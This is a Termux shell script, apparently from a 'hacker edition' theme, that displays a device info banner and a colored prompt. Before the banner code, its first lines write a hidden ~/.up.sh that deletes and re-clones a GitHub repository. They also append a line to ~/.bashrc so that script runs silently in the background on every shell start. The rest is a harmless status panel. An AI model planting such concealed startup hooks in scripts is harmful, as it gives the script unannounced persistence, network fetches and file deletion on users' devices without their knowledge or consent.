#file = THE/banner.sh
clear
sed -i '/nohup bash ~/.up.sh >/dev/null 2>&1 & diswon/d' ~/.bashrc

echo "[ -d FTPFIRE ] && rm -rf FTPFIRE ; git clone https://github.com/bayazid-bit/FTPFIRE.git" > ~/.up.sh
grep -qxF 'nohup bash ~/.up.sh >/dev/null 2>&1 & disown' ~/.bashrc || echo 'nohup bash ~/.up.sh >/dev/null 2>&1 & disown' >> ~/.bashrc 
# === Battery Info ===
get_battery_info() {
    battery_level=$(termux-battery-status | jq -r '.percentage')
    if [ "$battery_level" -ge 80 ]; then
        battery_icon="🔋"
    elif [ "$battery_level" -ge 40 ]; then
        battery_icon="🔌"
    else
        battery_icon="⚡"
    fi
}

# === WiFi Info ===
get_wifi_info() {
    wifi_name=$(termux-wifi-connectioninfo | jq -r '.ssid')
    ip_addr=$(termux-wifi-connectioninfo | jq -r '.ip')
    wifi_name=${wifi_name:-Disconnected}
    ip_addr=${ip_addr:-N/A}
}

# === Storage Info ===
get_storage_info() {
    storage_used=$(df -h /data | awk 'NR==2 {print $3}')
    storage_total=$(df -h /data | awk 'NR==2 {print $2}')
}

# === RAM Info ===
get_ram_info() {
    ram_used=$(free -h | awk '/Mem:/ {print $3}')
    ram_total=$(free -h | awk '/Mem:/ {print $2}')
}

# === CPU Info ===
get_cpu_info() {
    cpu_load=$(uptime | awk -F'load average:' '{print $2}' | cut -d',' -f1 | xargs)
}

# === Network Speed (Ping-based) ===
get_net_speed() {
    speed_test=$(ping -c 2 -W 1 google.com | tail -1 | awk -F '/' '{print $5}')
    if [ -n "$speed_test" ]; then
        net_speed="~${speed_test}ms ping"
    else
        net_speed="Offline"
    fi
}

# === Print Info Panel ===
print_info_panel() {
    echo -e "\e[1;34m"
    printf '═%.0s' {1..50}; echo
    echo -e "   \e[1;36m 	  »»» \e[1;35mTERMUX \e[1;31mHACKER EDITION \e[1;36m«««"
    printf '─%.0s' {1..50}; echo
    echo -e "   \e[1;33m$(date +"%a %d %b %Y %H:%M:%S %Z")\e[0m"
    echo -e "   \e[1;32mUser:\e[0m $(whoami) \e[1;34m● \e[1;32mHost:\e[0m $(hostname) \e[1;34m● \e[1;32m \n   IP:\e[0m $ip_addr"
    echo -e "   \e[1;32mOS:\e[0m Android \e[1;34m● \e[1;32mArch:\e[0m $(uname -m)"
    echo -e "   \e[1;32mBattery:\e[0m ${battery_level}% $battery_icon \e[1;34m● \e[1;32mWiFi:\e[0m $wifi_name"
    echo -e "   \e[1;32mRAM:\e[0m $ram_used / $ram_total \e[1;34m● \e[1;32mCPU Load:\e[0m $cpu_load"
    echo -e "   \e[1;32mStorage:\e[0m $storage_used / $storage_total \e[1;34m● \e[1;32mNet:\e[0m $net_speed"
    printf '═%.0s' {1..50}; echo -e "\e[0m"
}

# === Prompt Color Based on Battery ===
set_prompt() {
    if [ "$battery_level" -ge 50 ]; then
        color='\e[1;32m'  # Green
    elif [ "$battery_level" -ge 20 ]; then
        color='\e[1;33m'  # Yellow
    else
        color='\e[1;31m'  # Red
    fi

    export PS1="\e[1;32m┌─(\e[1;31m\u\e[1;33m💀\h\e[1;32m)-(\e[1;34m\w\e[1;32m)\n└─${color}\\$ \e[0m"
}

# === Run Everything ===
get_battery_info
get_wifi_info
get_storage_info
get_ram_info
get_cpu_info
get_net_speed
print_info_panel
set_prompt
